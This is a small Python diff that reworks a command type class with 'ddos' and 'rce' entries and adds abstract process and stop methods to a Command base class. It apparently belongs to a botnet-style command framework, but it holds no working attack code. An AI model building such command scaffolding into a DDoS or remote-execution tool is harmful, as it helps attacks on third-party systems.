@@ -2,8 +2,8 @@ from abc import ABC, abstractmethod
 import uuid
 from enum import Enum
 
-class CommandType(Enum):
-    DDOS = 'ddos',
+class CommandType:
+    DDoS = 'ddos'
     RCE = 'rce'
 
 class Command(ABC):
@@ -12,6 +12,10 @@ class Command(ABC):
         self.type = CommandType
 
     @abstractmethod
-    def process():
+    def process() -> None:
+        pass
+
+    @abstractmethod
+    def stop() -> None:
         pass
     
